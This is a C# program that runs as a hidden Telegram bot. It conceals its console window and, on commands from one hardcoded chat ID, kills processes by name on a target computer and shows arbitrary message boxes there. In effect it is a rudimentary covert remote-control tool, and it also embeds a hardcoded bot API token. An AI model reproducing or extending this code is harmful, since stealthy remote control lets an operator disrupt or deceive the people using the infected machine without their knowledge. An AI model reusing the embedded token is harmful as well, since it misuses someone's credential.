using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types;
using System.Drawing;
using System.Windows.Forms;
using System.Windows;
using MessageBox = System.Windows.Forms.MessageBox;

namespace TgBot
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;


        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            // Hide
            ShowWindow(handle, SW_HIDE);

            // Show
            // ShowWindow(handle, SW_SHOW);
            var client = new TelegramBotClient("5376040452:AAH7vnSweprjjIhWNQouiYAk40UvGBTb58o");
            client.StartReceiving(Update, Error);
            Console.ReadLine();
        }

        async static Task Error(ITelegramBotClient botClient, Exception update, CancellationToken token)
        {
            return;
        }

        async static Task Update(ITelegramBotClient botClient, Update update, CancellationToken token)
        {
            var message = update.Message;
            if (message.Text != null)
            {
                if (message.Chat.Id != 455077378)
                {
                    await botClient.SendTextMessageAsync(message.Chat.Id, "Нет.");
                }
                else
                {
                    // Закрытие всякого
                    if (message.Text.ToLower().StartsWith("/getdown "))
                    {
                        // Разделяем сообщение на команду и аргументы
                        string[] commandParts = message.Text.Split('|');

                        if (commandParts.Length != 2)
                        {
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Команда должна иметь формат '/getdown <имя компьютера> | <часть имени процесса>'.");
                            return;
                        }

                        string computerName = commandParts[0].Trim().Substring("/getdown ".Length).ToLower();
                        string partialProcessName = commandParts[1].Trim().ToLower();

                        if (Environment.MachineName.ToLower() == computerName)
                        {
                            Process[] allProcesses = Process.GetProcesses();

                            bool processFound = false;

                            foreach (var process in allProcesses)
                            {
                                if (process.ProcessName.ToLower().Contains(partialProcessName))
                                {
                                    process.Kill();
                                    await botClient.SendTextMessageAsync(message.Chat.Id, $"Процесс '{process.ProcessName}' успешно закрыт.");
                                    processFound = true;
                                }
                            }

                            if (!processFound)
                            {
                                await botClient.SendTextMessageAsync(message.Chat.Id, $"Не найден процесс с частичным совпадением '{partialProcessName}'.");
                            }
                        }
                        else
                        {
                            await botClient.SendTextMessageAsync(message.Chat.Id, $"Команда выполнена на компьютере '{computerName}'.");
                        }
                    }
                    // Сообщения
                    if (message.Text.StartsWith("/message "))
                    {
                        string commandText = message.Text.Substring("/message ".Length);
                        string[] parts = commandText.Split('|');
                        if (parts.Length < 2)
                        {
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Необходимо указать и текст сообщения, и название окна.");
                            return;
                        }
                        string messageText = parts[0].Trim();
                        string windowTitle = parts[1].Trim();
                        if (string.IsNullOrWhiteSpace(messageText) || string.IsNullOrWhiteSpace(windowTitle))
                        {
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Текст сообщения и название окна не могут быть пустыми.");
                            return;
                        }
                        MessageBox.Show(messageText, windowTitle);
                        // await botClient.SendTextMessageAsync(message.Chat.Id, "Сообщение с заголовком: " + windowTitle + " и текстом: " + messageText + " было отправлено.");
                        await botClient.SendTextMessageAsync(message.Chat.Id, $"Сообщение с заголовком: '{windowTitle}' и текстом '{messageText}' было отправлено.");
                    }
                }
            }
            else
            {
                return;
            }
        }
    }
}